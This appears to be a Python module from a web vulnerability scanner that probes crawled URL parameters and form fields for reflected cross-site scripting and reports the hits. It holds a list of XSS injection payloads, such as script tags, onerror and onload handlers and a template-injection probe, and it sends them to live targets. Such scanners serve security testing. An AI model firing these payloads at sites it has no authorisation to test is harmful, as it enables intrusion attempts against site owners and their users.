import re
from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from scanner.core.crawler import CrawlResult, Form
from scanner.utils.http_client import build_session, safe_get, safe_post
from scanner.utils.logger import get_logger, print_finding

logger = get_logger()

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    '"><img src=x onerror=alert(document.domain)>',
    "<body onload=alert(1)>",
    '";alert(1);//',
    "{{7*7}}",  # Template injection probe
]

# Unique marker we look for in the response to confirm reflection
XSS_MARKER = "xss_probe_marker_7x9z"
MARKER_PAYLOAD = f'<{XSS_MARKER}>'


@dataclass
class XSSFinding:
    url: str
    parameter: str
    payload: str
    reflected: bool
    severity: str = "HIGH"


def _is_reflected(response_text: str, payload: str) -> bool:
    return payload.lower() in response_text.lower()


def _test_url_params(session, url: str, params: list[str]) -> list[XSSFinding]:
    findings = []
    parsed = urlparse(url)
    base_params = {k: v[0] for k, v in parse_qs(parsed.query).items()}

    for param in params:
        # First, check if the param value is reflected at all
        probe_params = {**base_params, param: MARKER_PAYLOAD}
        probe_url = urlunparse(parsed._replace(query=urlencode(probe_params)))
        probe_response = safe_get(session, probe_url)

        if not probe_response or XSS_MARKER not in probe_response.text.lower():
            continue  # Value isn't reflected; skip

        # Value is reflected — try actual payloads
        for payload in XSS_PAYLOADS:
            injected_params = {**base_params, param: payload}
            injected_url = urlunparse(parsed._replace(query=urlencode(injected_params)))
            response = safe_get(session, injected_url)

            if response and _is_reflected(response.text, payload):
                finding = XSSFinding(url=url, parameter=param, payload=payload, reflected=True)
                findings.append(finding)
                print_finding("HIGH", "XSS", f"Reflected XSS at {url} — param: '{param}'")
                break

    return findings


def _test_form(session, form: Form) -> list[XSSFinding]:
    findings = []

    for field in form.fields:
        if field.field_type in ("submit", "button", "image", "file", "hidden", "password"):
            continue

        # Probe for reflection
        data = {f.name: f.value for f in form.fields}
        data[field.name] = MARKER_PAYLOAD

        if form.method == "post":
            probe_response = safe_post(session, form.action, data=data)
        else:
            probe_response = safe_get(session, form.action, params=data)

        if not probe_response or XSS_MARKER not in probe_response.text.lower():
            continue

        for payload in XSS_PAYLOADS:
            data[field.name] = payload

            if form.method == "post":
                response = safe_post(session, form.action, data=data)
            else:
                response = safe_get(session, form.action, params=data)

            if response and _is_reflected(response.text, payload):
                finding = XSSFinding(url=form.action, parameter=field.name, payload=payload, reflected=True)
                findings.append(finding)
                print_finding("HIGH", "XSS", f"Reflected XSS in form at {form.action} — field: '{field.name}'")
                break

    return findings


def check_xss(crawl_result: CrawlResult) -> list[XSSFinding]:
    logger.info("[XSS] Running Cross-Site Scripting checks")
    session = build_session()
    findings = []

    for url, params in crawl_result.params.items():
        findings.extend(_test_url_params(session, url, params))

    for form in crawl_result.forms:
        findings.extend(_test_form(session, form))

    if not findings:
        print_finding("INFO", "XSS", "No reflected XSS indicators detected")

    return findings
